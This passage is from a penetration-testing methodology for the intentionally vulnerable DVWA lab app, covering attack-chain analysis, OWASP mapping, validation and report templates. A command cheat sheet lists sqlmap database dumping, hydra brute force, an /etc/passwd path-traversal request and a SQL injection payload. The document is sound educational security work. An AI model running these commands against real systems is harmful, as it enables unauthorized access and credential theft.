---

# Attack Chain 3: XSS → Session Hijacking
1. Entry: Stored XSS (WV-005) - /vulnerabilities/xss_s/
   - Payload persisted in database
   - Executes for every visitor

2. Capture: Session cookie theft
   - Malicious JS sends cookie to attacker
   - No HttpOnly flag = accessible via JS

3. Takeover: Session hijack
   - Attacker uses stolen cookie
   - Admin session compromised

Overall Risk: HIGH (Score: 27/27)
```

---

### 5.5 OWASP Top 10 Mapping

```
# Compliance Mapping

A01 - Broken Access Control:
  - WV-007: CSRF allows unauthorized actions
  - WV-012: Missing security headers enable clickjacking

A03 - Injection:
  - WV-001: SQL Injection
  - WV-002: Command Injection
  - WV-005: Stored XSS
  - WV-006: Reflected XSS
  - WV-010: DOM XSS

A05 - Security Misconfiguration:
  - WV-003: File Upload - no type restriction
  - WV-004: File Inclusion - path traversal
  - WV-012: Missing security headers
  - WV-013: phpinfo() exposure, error messages

A07 - Identification & Authentication Failures:
  - WV-008: No brute force protection
  - WV-009: Weak/predictable session IDs
  - WV-011: CAPTCHA bypass possible

A09 - Security Logging & Monitoring Failures:
  - No rate limiting observed
  - Failed login attempts not throttled
  - No account lockout
```

---

### Deliverables:

```
05-reporting/
├── analysis/
│   ├── vulnerability-master-list.csv
│   ├── risk-scored-vulnerabilities.csv
│   ├── attack-chain-analysis.md
│   ├── owasp-mapping.md
│   └── prioritization-matrix.md
```

---

## Phase 6: Validation ✅

**Goal:** Verify findings, eliminate false positives, confirm exploitability without full exploitation

---

### 6.1 Validation Approach

```
Validation Priority:
- Critical findings: 100% validated
- High findings: 100% validated
- Medium findings: 50% sample
- Low findings: 25% sample
```

---

### 6.2 Validation Methods

```bash
# Method 1: Manual reproduction
# Reproduce each finding manually in browser
# Screenshot the exact steps and result

# Method 2: Cross-tool confirmation
# Confirm Nikto findings with manual curl
# Confirm sqlmap findings with manual payload

# Method 3: Version verification
# Confirm vulnerable versions via banner/headers
curl -I http://$DVWA_TARGET | grep -i "server\|x-powered-by" \
  | tee 06-validation/version-verification.txt

# Method 4: Searchsploit confirmation
searchsploit apache 2.4 | tee 06-validation/searchsploit-apache.txt
searchsploit php 7 | tee 06-validation/searchsploit-php.txt
```

---

### 6.3 Validation Tracker

```
| Vuln ID | Finding | Validation Method | Status | Confidence | Notes |
|---------|---------|-------------------|--------|------------|-------|
| WV-001 | SQL Injection | Manual + sqlmap | Confirmed | High | All users returned |
| WV-002 | Command Injection | Manual browser | Confirmed | High | whoami returned www-data |
| WV-003 | File Upload | Manual upload | Confirmed | High | PHP executed |
| WV-004 | LFI | Manual curl | Confirmed | High | /etc/passwd read |
| WV-005 | Stored XSS | Manual browser | Confirmed | High | Alert fired on page load |
| WV-006 | Reflected XSS | Manual browser | Confirmed | High | Alert fired |
| WV-007 | CSRF | Form analysis | Confirmed | High | No token present |
| WV-008 | Brute Force | Hydra (limited) | Confirmed | High | No lockout triggered |
| WV-009 | Weak Session | Pattern analysis | Confirmed | Medium | Sequential IDs |
| WV-010 | DOM XSS | Manual browser | Confirmed | Medium | Alert fired |
| WV-011 | CAPTCHA Bypass | Manual curl | Confirmed | High | Bypassed via direct POST |
| WV-012 | Missing Headers | curl -I analysis | Confirmed | High | Headers absent |
| WV-013 | Info Disclosure | Manual curl | Confirmed | Medium | phpinfo exposed |
```

---

### Deliverables:

```
06-validation/
├── validation-tracker.csv
├── version-verification.txt
├── searchsploit-results/
├── wv-001-sqli-validation.md
├── wv-002-cmdi-validation.md
├── wv-003-fileupload-validation.md
├── [additional per-finding validations]
├── false-positive-tracker.csv
└── evidence/
    └── [screenshots per finding]
```

---

## Phase 7: Reporting 📝

**Goal:** Professional, actionable documentation

---

### Report Structure

```
1. Executive Summary (1-2 pages)
   - High-level overview
   - Key statistics
   - Critical findings summary
   - Overall risk rating
   - Immediate recommendations

2. Methodology (1 page)
   - Scope and objectives
   - Tools used
   - OWASP testing methodology reference
   - Security levels assessed
   - Limitations

3. Findings Summary (2-3 pages)
   - Vulnerability statistics
   - Severity distribution chart
   - OWASP Top 10 coverage
   - Top 10 vulnerabilities table

4. Technical Findings (Main section)
   - One section per critical/high finding
   - Evidence screenshots
   - Risk analysis
   - Remediation steps

5. Risk Analysis (2-3 pages)
   - Attack chain documentation
   - Attack surface mapping
   - Exploitability vs. Impact matrix

6. Recommendations (2-3 pages)
   - Prioritized remediation roadmap
   - Quick wins
   - Long-term improvements
   - Secure coding recommendations

7. Appendices
   - Appendix A: Tool Configurations
   - Appendix B: Limitations and Assumptions
   - Appendix C: Complete Vulnerability List
   - Appendix D: Raw Scan Outputs
   - Appendix E: OWASP References
```

---

### Executive Summary Template

```markdown
# Executive Summary

## Assessment Overview
This vulnerability assessment was conducted against the DVWA (Damn Vulnerable Web Application) 
standalone virtual machine in a controlled laboratory environment. The assessment identified 
**13** security findings across **11** vulnerability modules, with **3** rated as Critical severity.

**Assessment Date:** [Date Range]
**Target System:** DVWA v2.3 ([IP Address])
**Assessment Type:** Web Application Vulnerability Assessment
**Methodology:** OWASP Testing Guide v4.2 / NIST SP 800-115

## Risk Summary
**Overall Risk Rating: CRITICAL**

The target application exhibits a severely vulnerable profile. Multiple pathways exist to 
achieve full application compromise, database access, and server-side code execution.

## Key Findings

### Critical Issues (Immediate Action Required)

1. **SQL Injection (WV-001)**
   - Location: /vulnerabilities/sqli/
   - Risk: Full database compromise
   - CVSS: 9.8 (Critical)

2. **Command Injection (WV-002)**
   - Location: /vulnerabilities/exec/
   - Risk: Server-side OS command execution
   - CVSS: 9.8 (Critical)

3. **Unrestricted File Upload (WV-003)**
   - Location: /vulnerabilities/upload/
   - Risk: Remote code execution via PHP upload
   - CVSS: 9.8 (Critical)

## Summary Statistics

| Severity | Count | Percentage |
|----------|-------|------------|
| Critical | 3     | 23%        |
| High     | 5     | 38%        |
| Medium   | 3     | 23%        |
| Low      | 2     | 16%        |
| Total    | 13    | 100%       |

## Conclusion
DVWA is intentionally vulnerable and demonstrates common web application security failures. 
All identified vulnerabilities are remediable through input validation, output encoding, 
proper authentication controls, and secure coding practices.
```

---

### Technical Finding Template

```markdown
## [WV-001] SQL Injection - Error-Based

### Vulnerability Details
- **OWASP Category:** A03:2021 - Injection
- **CVSS Score:** 9.8 (Critical)
- **CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
- **Affected URL:** http://[DVWA_IP]/vulnerabilities/sqli/
- **Parameter:** id (GET)
- **Security Level Tested:** Low
- **Discovery Method:** Manual testing + sqlmap
- **Validation Status:** CONFIRMED

### Description
The `id` parameter in the SQL Injection module is passed directly into a MySQL query 
without sanitization. An attacker can inject SQL syntax to manipulate the query, 
retrieve unauthorized data, or potentially write files to the server.

### Evidence
[Screenshot: SQL injection payload returning all users]
[Screenshot: sqlmap output showing database enumeration]

### Proof of Concept
**Payload:** `1' OR '1'='1`
**Result:** All user records returned

**sqlmap Confirmation:**
sqlmap identified the parameter as injectable using error-based technique.
Database version and table contents were enumerated without authentication.

### Risk Assessment
- **Exploitability:** HIGH - sqlmap automates exploitation
- **Impact:** CRITICAL - Full database access
- **Risk Score:** 36/36

### Remediation
- Use parameterized queries / prepared statements
- Implement input validation (whitelist approach)
- Apply principle of least privilege to database user
- Enable WAF rules for SQL injection patterns
- Remove verbose error messages

### References
- OWASP: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
```

---

### Deliverables:

```
05-reporting/
├── analysis/
│   ├── vulnerability-master-list.csv
│   ├── risk-scored-vulnerabilities.csv
│   ├── attack-chain-analysis.md
│   ├── owasp-mapping.md
│   └── prioritization-matrix.md
├── validation/
│   ├── validation-tracker.csv
│   ├── false-positive-tracker.csv
│   └── evidence/
├── drafts/
│   └── dvwa-report-draft.md
└── final/
    ├── dvwa-vulnerability-assessment-report.md
    ├── dvwa-vulnerability-assessment-report.pdf
    ├── executive-summary.pdf
    └── remediation-roadmap.xlsx
```

---

## Quick Reference Card

### Phase Checklist

```
✅ Phase 1: Pre-Engagement
   └─ DVWA downloaded, configured, isolated, default credentials documented

✅ Phase 2: Reconnaissance
   └─ Host discovered, web stack fingerprinted, tech identified

✅ Phase 3: Scanning
   └─ Nmap, Nikto, dirb/gobuster, ZAP completed

⚪ Phase 4: Enumeration
   └─ All 12 DVWA modules tested at Low security level

⚪ Phase 5: Analysis
   └─ Master list, risk scoring, attack chains, OWASP mapping

⚪ Phase 6: Validation
   └─ All critical/high findings confirmed, false positives eliminated

⚪ Phase 7: Reporting
   └─ Executive summary → Technical findings → Appendices → PDF
```

---

### DVWA Module Checklist

```
Authentication:
□ Default credentials
□ Session cookie flags
□ HTTPS enforcement

Vulnerability Modules (Low Security Level):
□ Brute Force
□ SQL Injection
□ Blind SQL Injection
□ Command Injection
□ XSS - Reflected
□ XSS - Stored
□ XSS - DOM
□ CSRF
□ File Inclusion (LFI/RFI)
□ File Upload
□ Insecure CAPTCHA
□ Weak Session IDs
□ JavaScript (Client-side validation)

Additional Checks:
□ HTTP security headers
□ Information disclosure (phpinfo, errors)
□ Directory enumeration findings
□ Backup/config file exposure
```

---

### Essential Commands

```bash
# Variables
export DVWA_TARGET=<TARGET_IP>
export SESS=<YOUR_PHPSESSID>

# Reconnaissance
whatweb http://$DVWA_TARGET
curl -I http://$DVWA_TARGET
nmap -sV -sC -p- $DVWA_TARGET -oA results/dvwa-full-scan

# Scanning
nikto -h http://$DVWA_TARGET -id admin:password -o nikto-results.txt
dirb http://$DVWA_TARGET /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://$DVWA_TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# SQLi
sqlmap -u "http://$DVWA_TARGET/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=$SESS;security=low" --dbs --batch

# Brute Force
hydra -l admin -P /usr/share/wordlists/rockyou.txt $DVWA_TARGET \
  http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect"

# LFI
curl "http://$DVWA_TARGET/vulnerabilities/fi/?page=../../../../etc/passwd" \
  --cookie "PHPSESSID=$SESS;security=low"

# Security Headers
curl -I http://$DVWA_TARGET | grep -iE "x-frame|csp|hsts|x-content|referrer"
```

---

## Methodology Principles

```
1. Systematic    → Follow phases in order, test all modules
2. Documented    → Screenshot everything, maintain evidence chain
3. Reproducible  → Commands are repeatable, steps are clear
4. Professional  → Portfolio-quality outputs
5. Safe          → PoC only where needed, no full exploitation
6. Comprehensive → Cover all DVWA modules across security levels
7. Validated     → Cross-check findings, eliminate false positives
8. Prioritized   → Risk-based approach, critical issues first
9. Actionable    → Specific remediation, not just findings
10. OWASP-aligned → Map all findings to OWASP Top 10
```

---

<div align="center">
	<p><strong>Methodology generated for educational purposes in an isolated lab environment.</strong></p>
  <p><strong>⭐ If you find my work valuable, please consider starring the projects</strong></p>
    <p><strong>Prepared By: Wilson Njoroge Wanderi</strong></p>
  <p><em>Last Updated: 20th February 2026</em></p>
</div>
